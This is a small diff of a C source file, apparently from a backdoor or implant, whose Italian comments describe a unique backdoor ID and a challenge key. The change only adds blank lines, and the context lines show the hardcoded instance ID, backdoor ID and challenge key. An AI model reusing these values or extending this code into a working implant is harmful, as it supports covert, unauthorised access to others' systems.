@@ -49,6 +49,9 @@ BYTE g_InstanceId[] = "bg5etG87q20Kg52W5Fg1";
 // 14 byte che identificano univocamente la backdoor
 BYTE g_BackdoorID[] = "EMp7Ca7-fpOBIr\x00\x00";
 
+
+
+
 // Chiave per il challenge
 BYTE g_Challenge[] = "ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ";
 
